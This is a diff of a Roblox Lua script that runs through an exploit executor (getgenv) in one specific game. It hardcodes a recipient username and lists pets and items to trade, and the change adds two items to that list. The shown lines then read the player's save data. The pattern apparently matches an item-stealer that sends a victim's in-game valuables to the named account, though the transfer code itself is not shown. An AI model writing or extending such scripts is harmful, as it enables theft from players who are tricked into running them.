@@ -5,7 +5,7 @@ if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {"Prison Axolotl", "Prison Cow"}
     getgenv().PaternToTrade = {0,1}
-    getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token"}
+    getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token", "Comet", "Basic Coin Jar"}
 
     local library = require(game.ReplicatedStorage.Library)
     local save = library.Save.Get()
